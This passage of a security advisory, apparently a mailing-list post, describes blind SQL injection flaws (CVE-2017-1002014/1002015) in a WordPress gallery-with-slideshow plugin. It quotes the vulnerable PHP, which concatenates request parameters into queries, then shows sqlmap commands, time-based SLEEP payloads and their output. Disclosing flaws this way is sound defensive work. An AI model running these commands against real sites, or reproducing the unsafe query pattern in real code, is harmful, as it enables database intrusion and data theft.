+364         global $wpdb;
+365         $table_prefix =3D $wpdb->prefix;
+366         $info =3D $_SERVER['DOCUMENT_ROOT'];
+367         $path_value =3D get_combo_path_value();
+368         $select_img_query_result =3D $wpdb->get_results("SELECT * FROM =
+`".$table_prefix."combo_image` WHERE gallery_id=3D".$id);
+
+
+384 if($_REQUEST['ival'] =3D=3D 'delete')
+385 {
+386         $path_value =3D get_combo_path_value();
+387         $id =3D $_REQUEST['gid'];
+388         global $wpdb;
+389         $table_prefix =3D $wpdb->prefix;
+390         $info =3D $_SERVER['DOCUMENT_ROOT'];
+391         $select_img_query_result1 =3D $wpdb->get_results("SELECT * FROM=
+ `".$table_prefix."combo_image` WHERE image_id=3D".$id);
+
+CVE-2017-1002014:
+Blind SQL Injection via gallery_name parameter.
+
+422 if(isset($_POST['gallery_submit']))
+423 {
+424         $gallery_name =3D $_REQUEST['gallery_name'];
+425         $insert_query_result =3D $wpdb->insert($table_prefix.'combo_gal=
+lery', array('gallery_name' =3D> $gallery_name,'date' =3D> current_time('my=
+sql')));
+426=20
+
+CVE-2017-1002015:
+Blind SQL Injection via selectMulGallery parameter.
+492 if(isset($_POST['image_submit']))
+493 {
+494         $gallery_id =3D $_POST['selectMulGallery'];
+495         $update_gallery_query =3D "UPDATE `".$table_prefix."combo_image=
+` SET gallery_id=3D".$gallery_id." WHERE gallery_id =3D '0'";
+496         $wpdb->query($update_gallery_query);
+
+Exploit Code:
+	=E2=80=A2 $ sqlmap -u 'http://example.com/wordpress/wp-admin/admin.php?pag=
+e=3Dgallery_with_slideshow&val=3Dview&gid=3D*' --load-cookies=3D./cookie.tx=
+t --dbms=3Dmysql --risk 2 --level 2
+	=E2=80=A2=20=20
+	=E2=80=A2=20=20
+	=E2=80=A2 Parameter: #1* (URI)
+	=E2=80=A2     Type: AND/OR time-based blind
+	=E2=80=A2     Title: MySQL >=3D 5.0.12 time-based blind - Parameter replace
+	=E2=80=A2     Payload: http://192.168.0.169:80/wordpress/wp-admin/admin.ph=
+p?page=3Dgallery_with_slideshow&val=3Dview&gid=3D(CASE WHEN (2912=3D2912) T=
+HEN SLEEP(5) ELSE 2912 END)
+	=E2=80=A2 ---
+	=E2=80=A2 [14:28:20] [INFO] the back-end DBMS is MySQL
+	=E2=80=A2 web server operating system: Linux Ubuntu 16.04 (xenial)
+	=E2=80=A2 web application technology: Apache 2.4.18
+	=E2=80=A2 back-end DBMS: MySQL >=3D 5.0.12
+	=E2=80=A2 [14:28:20] [INFO] fetched data logged to text files under '/home=
+/larry/.sqlmap/output/example.com'
+	=E2=80=A2=20=20
+	=E2=80=A2 [*] shutting down at 14:28:20
+	=E2=80=A2=20=20
+	=E2=80=A2=20=20
+	=E2=80=A2 $ sqlmap -u 'http://192.168.0.169/wordpress/wp-admin/admin.php?p=
+age=3Dgallery_with_slideshow&val=3Dimgedit&imgid=3D*&gid=3D1' --load-cookie=
+s=3D./cookie.txt --dbms=3Dmysql --risk 2 --level 2
+	=E2=80=A2 sqlmap identified the following injection point(s) with a total =
+of 337 HTTP(s) requests:
+	=E2=80=A2 ---
+	=E2=80=A2 Parameter: #1* (URI)
+	=E2=80=A2     Type: AND/OR time-based blind
+	=E2=80=A2     Title: MySQL >=3D 5.0.12 time-based blind - Parameter replace
+	=E2=80=A2     Payload: http://example.com:80/wordpress/wp-admin/admin.php?=
+page=3Dgallery_with_slideshow&val=3Dimgedit&imgid=3D(CASE WHEN (4482=3D4482=
+) THEN SLEEP(5) ELSE 4482 END)&gid=3D1
+	=E2=80=A2 ---
+	=E2=80=A2 [22:07:00] [INFO] the back-end DBMS is MySQL
+	=E2=80=A2 web server operating system: Linux Ubuntu 16.04 (xenial)
+	=E2=80=A2 web application technology: Apache 2.4.18
+	=E2=80=A2 back-end DBMS: MySQL >=3D 5.0.12
+	=E2=80=A2 [22:07:00] [INFO] fetched data logged to text files under '/home=
+/larry/.sqlmap/output/example.com'=
